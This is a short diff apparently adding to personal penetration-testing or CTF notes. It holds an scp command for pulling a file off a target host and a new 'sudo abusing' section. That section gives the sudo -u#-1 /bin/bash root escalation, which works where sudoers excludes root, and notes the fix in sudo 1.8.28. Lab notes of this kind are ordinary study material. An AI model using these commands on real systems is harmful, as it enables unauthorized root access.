@@ -12,3 +12,11 @@ if in the target system there is .ssh folder,I can generate my pub,priv key with
 ```
 scp -i privatekey user@targetip:/home/user.txt . : transfert user.txt to my local directory
 ```
+## sudo abusing
+```
+vi visudo : to open the file listed with sudo -l
+if in the file there is: user  ALL=(ALL,!root) ALL
+I can run any commande with root priviledge like this: sudo -u#-1 /bin/bash  => BOOM,root access
+ALso: user  ALL=(ALL,!abdo) ALL, I can have root access: sudo -u#-1 /bin/bash
+bug fixed in 1.8.28  => get your current version $ sudo -V
+```
